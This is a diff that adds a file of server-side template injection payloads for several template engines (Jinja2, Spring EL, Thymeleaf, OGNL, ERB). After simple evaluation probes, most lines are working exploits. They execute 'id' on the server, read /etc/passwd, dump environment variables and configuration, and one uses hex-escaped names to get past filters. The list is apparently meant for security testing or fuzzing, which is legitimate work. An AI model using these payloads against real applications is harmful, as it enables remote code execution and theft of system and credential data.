@@ -1,0 +1,17 @@
+${7*7}
+{{7*7}}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{url_for.__globals__.os.popen('id').read()}}
+${#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('id')}
+${T(java.lang.System).getenv()}
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
